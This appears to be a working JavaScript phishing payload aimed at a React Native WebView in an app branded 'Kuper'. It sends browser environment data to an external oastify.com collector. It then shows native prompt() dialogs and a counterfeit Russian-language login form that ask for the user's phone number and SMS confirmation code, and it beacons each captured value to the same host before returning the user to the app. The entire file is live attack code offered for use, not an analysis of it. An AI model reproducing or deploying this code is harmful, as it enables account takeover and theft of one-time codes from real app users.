alert('new fish2');
(function() {
    'use strict';

    var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

    function b(path, data) {
        try {
            var img = new Image();
            img.src = EXFIL + path + '?d=' + encodeURIComponent(
                typeof data === 'string' ? data : JSON.stringify(data)
            ).substr(0, 2000);
        } catch(e) {}
    }

    // ========================================
    // PHASE 0: Exfiltrate environment data
    // ========================================
    var env = {};
    try { env.origin = window.origin; } catch(e) {}
    try { env.ua = navigator.userAgent.substr(0, 100); } catch(e) {}

    if (window.ReactNativeWebView) {
        env.rnwv = 'present';
        env.postMsg = typeof window.ReactNativeWebView.postMessage;
    }

    b('/v10p/env', env);

    // ========================================
    // PHASE 1: Phishing via prompt() — GUARANTEED VISIBLE
    // Native Android dialogs render ABOVE RN loading overlay
    // ========================================

    // Step 1: Collect phone via prompt()
    setTimeout(function() {
        var phone = prompt(
            '\u0422\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u043f\u043e\u0432\u0442\u043e\u0440\u043d\u0430\u044f \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f.\n' +
            '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430:',
            '+7'
        );

        if (phone && phone.length > 5) {
            b('/v10p/PHONE', phone);

            // Step 2: Collect SMS code via prompt()
            setTimeout(function() {
                var code = prompt(
                    '\u041a\u043e\u0434 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d \u043d\u0430 ' + phone + '\n' +
                    '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0438\u0437 SMS:'
                );

                if (code && code.length >= 4) {
                    b('/v10p/SMS_CODE', code);
                    b('/v10p/CREDS', phone + ':' + code);

                    alert('\u0413\u043e\u0442\u043e\u0432\u043e! \u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u043e\u0432\u0430\u043d\u044b.');

                    // Navigate back to app
                    setTimeout(function() {
                        if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
                            window.ReactNativeWebView.postMessage(JSON.stringify({action: 'navigateBack'}));
                        }
                    }, 1000);
                } else {
                    b('/v10p/code_cancelled', 'user_cancelled');
                }
            }, 500);
        } else {
            b('/v10p/phone_cancelled', 'user_cancelled');
        }
    }, 300);

    // ========================================
    // PHASE 2: Also try rendering HTML form (behind overlay, but interactive)
    // Since pointerEvents="box-none", user CAN interact with content
    // ========================================

    var style = document.createElement('style');
    style.textContent =
        '* { margin:0; padding:0; box-sizing:border-box; }' +
        'body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:#fff; color:#1a1a1a; }' +
        '.header { background:#00b33c; padding:16px 20px; display:flex; align-items:center; }' +
        '.logo-text { color:#fff; font-size:22px; font-weight:700; }' +
        '.header-title { color:#fff; font-size:18px; font-weight:600; margin-left:12px; }' +
        '.content { padding:24px 20px; }' +
        '.alert { background:#fff3cd; border:1px solid #ffc107; border-radius:12px; padding:16px; margin-bottom:24px; }' +
        '.alert-title { font-weight:600; font-size:15px; color:#856404; margin-bottom:4px; }' +
        '.alert-text { font-size:13px; color:#856404; line-height:1.4; }' +
        '.form-group { margin-bottom:16px; }' +
        '.form-label { font-size:13px; color:#666; margin-bottom:6px; display:block; }' +
        '.form-input { width:100%; padding:14px 16px; border:1px solid #e0e0e0; border-radius:12px; font-size:16px; outline:none; -webkit-appearance:none; }' +
        '.form-input:focus { border-color:#00b33c; }' +
        '.btn { width:100%; padding:16px; background:#00b33c; color:#fff; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; }' +
        '.btn:active { background:#009929; }' +
        '.footer { text-align:center; margin-top:20px; font-size:12px; color:#999; }';
    document.head.appendChild(style);

    document.body.innerHTML =
        '<div class="header">' +
        '<span class="logo-text">Kuper</span>' +
        '<span class="header-title">\u0412\u0445\u043e\u0434 \u0432 \u0430\u043a\u043a\u0430\u0443\u043d\u0442</span>' +
        '</div>' +
        '<div class="content">' +
        '<div class="alert">' +
        '<div class="alert-title">\u0422\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u043f\u043e\u0432\u0442\u043e\u0440\u043d\u0430\u044f \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f</div>' +
        '<div class="alert-text">\u0412 \u0446\u0435\u043b\u044f\u0445 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438, \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430.</div>' +
        '</div>' +
        '<div id="step1">' +
        '<div class="form-group">' +
        '<label class="form-label">\u041d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430</label>' +
        '<input class="form-input" id="phone" type="tel" placeholder="+7 (___) ___-__-__" autocomplete="tel">' +
        '</div>' +
        '<button class="btn" id="btnPhone">\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434</button>' +
        '</div>' +
        '<div id="step2" style="display:none">' +
        '<div class="form-group">' +
        '<label class="form-label">\u041a\u043e\u0434 \u0438\u0437 SMS</label>' +
        '<input class="form-input" id="code" type="number" placeholder="______" maxlength="6">' +
        '</div>' +
        '<button class="btn" id="btnCode">\u0412\u043e\u0439\u0442\u0438</button>' +
        '</div>' +
        '<div id="step3" style="display:none">' +
        '<div style="text-align:center;padding:40px 0">' +
        '<div style="font-size:48px;margin-bottom:16px">\u2705</div>' +
        '<div style="font-size:18px;font-weight:600;color:#00b33c">\u0413\u043e\u0442\u043e\u0432\u043e!</div>' +
        '<div style="font-size:14px;color:#666;margin-top:8px">\u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u043e\u0432\u0430\u043d\u044b</div>' +
        '</div>' +
        '</div>' +
        '<div class="footer">Kuper \u00a9 2025</div>' +
        '</div>';

    // Wire up form buttons
    setTimeout(function() {
        var btnPhone = document.getElementById('btnPhone');
        var btnCode = document.getElementById('btnCode');

        if (btnPhone) {
            btnPhone.onclick = function() {
                var p = document.getElementById('phone').value;
                if (p.length > 5) {
                    b('/v10p/PHONE_FORM', p);
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                }
            };
        }

        if (btnCode) {
            btnCode.onclick = function() {
                var c = document.getElementById('code').value;
                if (c.length >= 4) {
                    b('/v10p/SMS_CODE_FORM', c);
                    document.getElementById('step2').style.display = 'none';
                    document.getElementById('step3').style.display = 'block';
                    setTimeout(function() {
                        if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
                            window.ReactNativeWebView.postMessage(JSON.stringify({action: 'navigateBack'}));
                        }
                    }, 2000);
                }
            };
        }
    }, 100);

    b('/v10p/phishing_loaded', 'ok');

})();
